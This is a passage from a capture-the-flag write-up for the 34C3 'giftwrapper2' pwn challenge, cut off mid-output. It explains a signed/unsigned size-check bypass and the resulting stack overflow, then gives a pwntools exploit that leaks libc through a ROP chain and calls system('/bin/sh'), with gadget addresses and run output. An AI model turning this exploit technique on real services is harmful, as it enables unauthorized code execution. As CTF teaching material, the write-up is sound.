+</span></span><span style=display:flex><span>Base address: 0x7f770a712000
+</span></span><span style=display:flex><span>************************************
+</span></span><span style=display:flex><span>&gt; wrap
+</span></span><span style=display:flex><span>What is the size of the gift you want to wrap?
+</span></span><span style=display:flex><span> |&gt; <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span>Please send me your gift.
+</span></span><span style=display:flex><span> |&gt; TEST GIFT
+</span></span><span style=display:flex><span>         _   _
+</span></span><span style=display:flex><span>        <span style=color:#f92672>((</span><span style=color:#ae81ff>\o</span>/<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span> .-------//^<span style=color:#ae81ff>\\</span>------.
+</span></span><span style=display:flex><span> |      /<span style=color:#e6db74>`</span>   <span style=color:#e6db74>`</span><span style=color:#ae81ff>\ </span>    |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span> | TEST GIFT        |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span>  ------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wow! This looks so beautiful
+</span></span><span style=display:flex><span>&gt; 
+</span></span></code></pre></div><p>The <code>modinfo</code> command prints some info about the loaded module and its base address. Probably this is about the <code>giftwrapper2.so</code> found in the challenge files.</p><p>The <code>wrap</code> command asks about the size of the gift and the gift text after that a nice ascii art is shown containing the gift message.</p><p>Since the gift message is printed back to us, I thought it will be a good idea to test if there is a <code>format string</code> vulnerability. Turns out there wasn&rsquo;t.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&gt; wrap
+</span></span><span style=display:flex><span>What is the size of the gift you want to wrap?
+</span></span><span style=display:flex><span> |&gt; <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span>Please send me your gift.
+</span></span><span style=display:flex><span> |&gt; %d
+</span></span><span style=display:flex><span>         _   _
+</span></span><span style=display:flex><span>        <span style=color:#f92672>((</span><span style=color:#ae81ff>\o</span>/<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span> .-------//^<span style=color:#ae81ff>\\</span>------.
+</span></span><span style=display:flex><span> |      /<span style=color:#e6db74>`</span>   <span style=color:#e6db74>`</span><span style=color:#ae81ff>\ </span>    |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span> | %d               |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span>  ------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wow! This looks so beautiful
+</span></span><span style=display:flex><span>&gt; 
+</span></span></code></pre></div><p>Now let&rsquo;s see what happen if the gift message is longer then the size we typed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&gt; wrap
+</span></span><span style=display:flex><span>What is the size of the gift you want to wrap?
+</span></span><span style=display:flex><span> |&gt; <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Please send me your gift.
+</span></span><span style=display:flex><span> |&gt; ABCDEFGHIJKLM
+</span></span><span style=display:flex><span>         _   _
+</span></span><span style=display:flex><span>        <span style=color:#f92672>((</span><span style=color:#ae81ff>\o</span>/<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span> .-------//^<span style=color:#ae81ff>\\</span>------.
+</span></span><span style=display:flex><span> |      /<span style=color:#e6db74>`</span>   <span style=color:#e6db74>`</span><span style=color:#ae81ff>\ </span>    |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span> | ABC              |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span>  ------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wow! This looks so beautiful
+</span></span><span style=display:flex><span>&gt; wrap
+</span></span><span style=display:flex><span>What is the size of the gift you want to wrap?
+</span></span><span style=display:flex><span> |&gt; <span style=color:#ae81ff>10000</span>
+</span></span><span style=display:flex><span>Sorry! This gift is too large.
+</span></span><span style=display:flex><span>&gt; 
+</span></span></code></pre></div><p>Hmm, it gets truncated, and we are also not allowed to have a very big gift message. So the size field is probably controlled.</p><p>Now that we understand what the server is doing, let&rsquo;s check the source file.</p><p>The server code found in <code>server.c</code> is very straightforward,</p><ul><li>Setup a socket</li><li>Load the <code>giftwrapper2.so</code> module</li><li>Enter the regular <code>accept -> fork -> drop_priv -> interact</code> loop</li></ul><p>The <code>interact</code> function securely reads data from the user, and then calls <code>handle_input</code> which executes the corresponding command based on the user input.</p><p>The <code>load_module</code> function is as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>load_module</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> error;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> handle <span style=color:#f92672>=</span> dlopen(LIB, RTLD_LAZY);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>handle) {
+</span></span><span style=display:flex><span>        logf(<span style=color:#e6db74>&#34;Error on dlopen %s: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, LIB, dlerror());
+</span></span><span style=display:flex><span>        exit(EXIT_FAILURE);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    dlerror();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>link_map</span><span style=color:#f92672>*</span> lm <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>link_map</span><span style=color:#f92672>*</span>) handle;
+</span></span><span style=display:flex><span>    module.base <span style=color:#f92672>=</span> lm<span style=color:#f92672>-&gt;</span>l_addr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    initialize_module <span style=color:#f92672>=</span> dlsym(handle, <span style=color:#e6db74>&#34;initialize_module&#34;</span>);
+</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;%p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, initialize_module);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((error <span style=color:#f92672>=</span> dlerror()) <span style=color:#f92672>!=</span> NULL)  {
+</span></span><span style=display:flex><span>        logf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, error);
+</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    initialize_module(<span style=color:#f92672>&amp;</span>module, register_command);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    register_command(<span style=color:#e6db74>&#34;help&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t\t\t</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;Show this information&#34;</span>, help);
+</span></span><span style=display:flex><span>    register_command(<span style=color:#e6db74>&#34;modinfo&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t\t</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;Show information about the loaded module&#34;</span>, module_info);
+</span></span><span style=display:flex><span>    logf(<span style=color:#e6db74>&#34;Module successfully loaded.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Mainly it loads the <code>giftwrapper2.so</code> module, calls <code>initialize_module</code> within that module and pass the <code>register_command</code> as its second argument. After that, it registers two commands <code>help</code> and <code>modinfo</code>.</p><p>So probably the <code>wrap</code> command is registered by the module itself.</p><p>Now it&rsquo;s time to reverse engineer the <code>giftwrapper2.so</code> module and hopefully find a flaw there. For this task, I used Binary Ninja, the symbols were not stripped so it&rsquo;s easy to spot the <code>wrap</code> function and disassemble it.</p><p><figure><img src=../../content-assets/34c3-ctf-giftwrapper2/giftwrapper2-binja-wrap.png width=100%></figure></p><p>The logic behind this function is the following:</p><ul><li>Read the size from the user and store it into a buffer<ul><li>If the read fails -> exit</li></ul></li><li>Call <code>strtol</code> to convert the size into a number.<ul><li>If the size is above 99 -> print an error message and exit the function</li><li>Else, use the <code>read</code> function and pass the size as its argument in order to read up to <code>size</code> bytes.</li></ul></li></ul><p>Even though it sounds secure, it&rsquo;s not. The flaw is within this block, can you spot it?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span>x855: <span style=color:#a6e22e>lea</span> <span style=color:#66d9ef>rdi</span>, <span style=color:#66d9ef>rsp</span> <span style=color:#960050;background-color:#1e0010>+</span> <span style=color:#ae81ff>0x65</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span>x85a: <span style=color:#a6e22e>mov</span> <span style=color:#66d9ef>edx</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span>x85f: <span style=color:#a6e22e>mov</span> <span style=color:#66d9ef>esi</span>, <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span>x864: <span style=color:#a6e22e>call</span> <span style=color:#66d9ef>strtol</span>         <span style=color:#75715e>; convert size to long
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>0</span>x869: <span style=color:#a6e22e>mov</span> <span style=color:#66d9ef>rbp</span>, <span style=color:#66d9ef>rax</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span>x86c: <span style=color:#a6e22e>cmp</span> <span style=color:#66d9ef>ax</span>, <span style=color:#ae81ff>0x63</span>        <span style=color:#75715e>; compare size with 0x63 (99 in decimal)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>0</span>x870: <span style=color:#a6e22e>jg</span> <span style=color:#ae81ff>0x94c</span>            <span style=color:#75715e>; jump to 0x94c if greater
+</span></span></span></code></pre></div><p>The conditional jump is done using the <code>jg</code> instruction which is used for <strong>signed</strong> comparison. Check this nice page to better understand <a href=http://unixwiz.net/techtips/x86-jumps.html>x86-jumps</a>. But the <code>read</code> function interprets its argument as an unsigned integer, which means if, when prompted for the size, we type <code>-1</code> (<strong>0xffffffff</strong> in hex) we can bypass the check against <strong>0x63</strong>. This is possible because <strong>0xffffffff &lt; 0x63</strong> when they are interpreted as <em>signed</em> numbers.</p><p>Later when we reach the <code>read</code> function, <strong>0xffffffff</strong> is interpreted as an unsigned number so it&rsquo;s possible to read up to <code>4GB</code> of data.</p><p>Using this, we can probably write beyond the buffer boundaries and cause an overflow. To verify this hypothesis, let&rsquo;s try to crash the binary.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nc <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>12345</span>
+</span></span><span style=display:flex><span>*
+</span></span><span style=display:flex><span>* Gift Wrapping Factory
+</span></span><span style=display:flex><span>*
+</span></span><span style=display:flex><span>Welcome to the new gift wrapping service!
+</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;help&#34;</span> <span style=color:#66d9ef>for</span> help :<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>&gt; wrap
+</span></span><span style=display:flex><span>What is the size of the gift you want to wrap?
+</span></span><span style=display:flex><span> |&gt; -1
+</span></span><span style=display:flex><span>Please send me your gift.
+</span></span><span style=display:flex><span> |&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style=display:flex><span>         _   _
+</span></span><span style=display:flex><span>        <span style=color:#f92672>((</span><span style=color:#ae81ff>\o</span>/<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span> .-------//^<span style=color:#ae81ff>\\</span>------.
+</span></span><span style=display:flex><span> |      /<span style=color:#e6db74>`</span>   <span style=color:#e6db74>`</span><span style=color:#ae81ff>\ </span>    |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span>  ------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wow! This looks so beautiful
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>Great! Instead of printing the prompt again, the connection immediately exits after printing the ASCII art, which means we probably did overwrite the return address stored in the stack, thus crashing the binary.</p><p>Using <code>rabin2</code> from the <a href=http://rada.re/r/>radare2</a> suite, we can get some info from the binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ rabin2 -I server
+</span></span><span style=display:flex><span>arch     x86
+</span></span><span style=display:flex><span>binsz    <span style=color:#ae81ff>12597</span>
+</span></span><span style=display:flex><span>bintype  elf
+</span></span><span style=display:flex><span>bits     <span style=color:#ae81ff>64</span>
+</span></span><span style=display:flex><span>canary   false
+</span></span><span style=display:flex><span>class    ELF64
+</span></span><span style=display:flex><span>crypto   false
+</span></span><span style=display:flex><span>endian   little
+</span></span><span style=display:flex><span>havecode true
+</span></span><span style=display:flex><span>intrp    /lib64/ld-linux-x86-64.so.2
+</span></span><span style=display:flex><span>lang     c
+</span></span><span style=display:flex><span>linenum  true
+</span></span><span style=display:flex><span>lsyms    true
+</span></span><span style=display:flex><span>machine  AMD x86-64 architecture
+</span></span><span style=display:flex><span>maxopsz  <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>minopsz  <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>nx       true
+</span></span><span style=display:flex><span>os       linux
+</span></span><span style=display:flex><span>pcalign  <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>pic      false
+</span></span><span style=display:flex><span>relocs   true
+</span></span><span style=display:flex><span>relro    partial
+</span></span><span style=display:flex><span>rpath    NONE
+</span></span><span style=display:flex><span>static   false
+</span></span><span style=display:flex><span>stripped false
+</span></span><span style=display:flex><span>subsys   linux
+</span></span><span style=display:flex><span>va       true
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>Great, no <a href=https://en.wikipedia.org/wiki/Stack_buffer_overflow>stack canary</a>, but the stack is not executable (<a href=https://en.wikipedia.org/wiki/NX_bit>NX Bit</a> enabled).</p><p>The next step is to know from what offset we start controlling the instruction pointer <strong>rip</strong>, we can do this manually by trying different lengths, but we can also use <code>ragg2</code> to generate a <a href=https://en.wikipedia.org/wiki/De_Bruijn_sequence>Debruijn sequence</a> and calculate the exact offset after the crash.</p><p>The size of wrap&rsquo;s stack frame is <strong>0x70</strong> (112 in decimal), so let&rsquo;s generate a sequence slightly greater than 112</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ ragg2 -r -P <span style=color:#ae81ff>140</span>
+</span></span><span style=display:flex><span>AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuA
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>Now we can either attach the server to a debugger, configure it to follow child process, and wait for it to crash so we can get the value of <code>rip</code> register and calculate the offset, or simply use the <code>dmesg</code> command to print info about the last crashes happened in our system. Since I&rsquo;m lazy, I went for the second approach.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nc <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>12345</span>
+</span></span><span style=display:flex><span>*
+</span></span><span style=display:flex><span>* Gift Wrapping Factory
+</span></span><span style=display:flex><span>*
+</span></span><span style=display:flex><span>Welcome to the new gift wrapping service!
+</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;help&#34;</span> <span style=color:#66d9ef>for</span> help :<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>&gt; -1
+</span></span><span style=display:flex><span>Command not found.
+</span></span><span style=display:flex><span>&gt; wrap
+</span></span><span style=display:flex><span>What is the size of the gift you want to wrap?
+</span></span><span style=display:flex><span> |&gt; -1
+</span></span><span style=display:flex><span>Please send me your gift.
+</span></span><span style=display:flex><span> |&gt; AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2
+</span></span><span style=display:flex><span>         _   _
+</span></span><span style=display:flex><span>        <span style=color:#f92672>((</span><span style=color:#ae81ff>\o</span>/<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span> .-------//^<span style=color:#ae81ff>\\</span>------.
+</span></span><span style=display:flex><span> |      /<span style=color:#e6db74>`</span>   <span style=color:#e6db74>`</span><span style=color:#ae81ff>\ </span>    |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span> |                  |
+</span></span><span style=display:flex><span>  ------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wow! This looks so beautiful
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ sudo dmesg | tail
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 6285.218361<span style=color:#f92672>]</span> clocksource: Switched to clocksource hpet
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13404.975546<span style=color:#f92672>]</span> server<span style=color:#f92672>[</span>2981<span style=color:#f92672>]</span>: segfault at <span style=color:#ae81ff>41754141</span> ip <span style=color:#e6db74>`</span>0000000041754141<span style=color:#e6db74>`</span> sp 00007fff8cbed360 error <span style=color:#ae81ff>14</span> in libnss_files-2.25.so<span style=color:#f92672>[</span>7f7709ed4000+b000<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>Great, at the moment of the crash, the instruction pointer was pointing to <strong>0x41754141</strong>. Again using <code>ragg2</code> we can calculate the offset.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ ragg2 -q 0x41754141
+</span></span><span style=display:flex><span>Little endian: <span style=color:#ae81ff>136</span>
+</span></span><span style=display:flex><span>Big endian: <span style=color:#ae81ff>137</span>
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>From <code>rabin2</code> output, we already know that the binary&rsquo;s <a href=https://en.wikipedia.org/wiki/Endianness>endianess</a> is Little Endian, so the offset value is <strong>136</strong>.</p><p>At this step we know that we control the instruction pointer, we also know that the stack is not executable. One way to exploit this is to <a href=https://en.wikipedia.org/wiki/Return-to-libc_attack>return to libc</a>, but since we don&rsquo;t know at what address <code>libc</code> is mapped in the virtual memory, we need to leak some addresses.</p><p>Using <a href=https://en.wikipedia.org/wiki/Return-oriented_programming>ROP</a> we can read data from anywhere, this is done because the function <code>puts</code> actually prints bytes from the address pointed by the <code>rdi</code> register. So by chaining
+<code>pop rdi</code> and <code>call puts</code> gadgets we can mount a read-anywhere attack. In order to calculate <code>libc</code> base address, we need to read the address of any symbol from it. Reading any symbol from the <a href=https://en.wikipedia.org/wiki/Global_Offset_Table>GOT</a> table allows us to leak addresses from <code>libc</code>, one good candidate is <code>puts</code> entry in <code>GOT</code>, to get its address we can use <code>objdump -R</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ objdump -R server
+</span></span><span style=display:flex><span>server:     file format elf64-x86-64
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>DYNAMIC RELOCATION RECORDS
+</span></span><span style=display:flex><span>OFFSET           TYPE              VALUE
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0x00000000602018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>Now we only need a <code>pop rdi</code> gadget. By using <code>radare2</code> we can get that, below we see that radare2 found two <code>pop rdi</code> gadgets:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ radare2 server
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x00400dc0<span style=color:#f92672>]</span>&gt; /Rl pop rdi
+</span></span><span style=display:flex><span>0x00401550: pop rdi; ret; 
+</span></span><span style=display:flex><span>0x004015c3: pop rdi; ret;
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0x00400dc0<span style=color:#f92672>]</span>&gt; 
+</span></span></code></pre></div><p>The following python code connects to the server, interact with it and then send our rop chain. I&rsquo;m using <a href=https://github.com/Gallopsled/pwntools>Pwntools</a> to do this since it makes network programming much more easy and funny.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;localhost&#39;</span>, <span style=color:#ae81ff>12345</span>)
+</span></span><span style=display:flex><span>pop_rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00401550</span>
+</span></span><span style=display:flex><span>puts_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x602018</span>
+</span></span><span style=display:flex><span>call_puts <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0040122f</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rop <span style=color:#f92672>=</span> p64(pop_rdi)
+</span></span><span style=display:flex><span>rop <span style=color:#f92672>+=</span> p64(puts_got)
+</span></span><span style=display:flex><span>rop <span style=color:#f92672>+=</span> p64(call_puts)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>136</span>  <span style=color:#75715e># fill the buffer</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> rop       <span style=color:#75715e># Append our rop chain</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;wrap&#34;</span>)  <span style=color:#75715e># Send the wrap command</span>
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;|&gt; &#34;</span>, <span style=color:#e6db74>&#34;-1&#34;</span>)  <span style=color:#75715e># set the size to -1</span>
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;|&gt; &#34;</span>, payload)  <span style=color:#75715e># send the payload</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Get the last sent line, this contains raw data read from *puts_got</span>
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Wow! This looks so beautiful</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)  <span style=color:#75715e># recv the data</span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>print(repr(data)) <span style=color:#75715e># print raw data so we can verify</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Pad the address to 8 bytes so we can unpack it</span>
+</span></span><span style=display:flex><span>pad <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> len(data))
+</span></span><span style=display:flex><span>addr <span style=color:#f92672>=</span> data <span style=color:#f92672>+</span> pad
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Unpack the addr</span>
+</span></span><span style=display:flex><span>puts_absolute <span style=color:#f92672>=</span> u64(addr)
+</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;puts is at&#34;</span>, hex(puts_absolute)
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ python giftwrapper2_exploit.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>..<span style=color:#f92672>]</span> Opening connection to localhost on port 12345: Trying 127.0.0.1
+</span></span><span style=display:flex><span>New connection from 127.0.0.1 on port <span style=color:#ae81ff>40450</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to localhost on port 12345: Done
+</span></span><span style=display:flex><span>127.0.0.1:40450 disconnected
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;`\xc4\x07\xa0\xeb\x7f&#39;</span>
+</span></span><span style=display:flex><span>puts is at 0x7feba007c460
+</span></span></code></pre></div><p>Now we know that the absolute address of <code>puts</code> is <strong>0x7feba007c460</strong>, and since we have the libc used by the server we can know puts&rsquo; offset within that libc, we just need to open <code>libc-2.26.so</code> using binary ninja (or radare2 and use the <code>is</code> command) and navigate to <code>puts</code> function:</p><p><figure class=text-center><img src=../../content-assets/34c3-ctf-giftwrapper2/giftwrapper2-binja-puts.png></figure></p><p>Here it shows that puts&rsquo; offset within libc is <strong>0x78460</strong>, given this, we can calculate libc base address.</p><blockquote><p>libc_base = puts absolute address - puts relative offset</p><p>libc_base = <strong>0x7feba007c460</strong> - <strong>0x78460</strong> = <strong>0x7feba0004000</strong></p></blockquote><p>By having the libc base address we can get the absolute address of any other symbol within it, so now we just need to call <code>system("/bin/sh")</code> and have our flag.</p><p>Again using binary ninja we can get the offset of <code>system</code> as well as the string <code>/bin/sh</code>. Argument for <code>system</code> are passed via the <code>rdi</code> register, so just before jumping into it we need to load rdi with the address of <code>/bin/sh</code>.</p><p>We already have a <code>pop rdi</code> gadget so this should be easy now. The final exploit is the following:</p><script src=https://gist.github.com/segflow/65ed5e55ad83ce9b5cf4aec9c0bc3ced.js></script><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&gt; $ python giftwrapper2_exploit.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>/.......<span style=color:#f92672>]</span> Opening connection to localhost on port 12345: Trying 127.0.0.1
+</span></span><span style=display:flex><span>New connection from 127.0.0.1 on port <span style=color:#ae81ff>40450</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to localhost on port 12345: Done
+</span></span><span style=display:flex><span>127.0.0.1:40450 disconnected
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;`\xc4\x07\xa0\xeb\x7f&#39;</span>
+</span></span><span style=display:flex><span>puts is at 0x7feba007c460
+</span></span><span style=display:flex><span>libc is at 0x7feba0004000
+</span></span><span style=display:flex><span>system is at 0x7feba0052d60
+</span></span><span style=display:flex><span>/bin/sh is at 0x7feba017a917
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to localhost port <span style=color:#ae81ff>12345</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>▁<span style=color:#f92672>]</span> Opening connection to localhost on port 12345: Trying 127.0.0.1
+</span></span><span style=display:flex><span>New connection from 127.0.0.1 on port <span style=color:#ae81ff>40452</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to localhost on port 12345: Done
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
+</span></span><span style=display:flex><span>         _   _
+</span></span><span style=display:flex><span>        <span style=color:#f92672>((</span><span style=color:#ae81ff>\o</span>/<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span> .-------//^<span style=color:#ae81ff>\\</span>------.
+</span></span><span style=display:flex><span> |      /<span style=color:#e6db74>`</span>   <span style=color:#e6db74>`</span><span style=color:#ae81ff>\ </span>    |
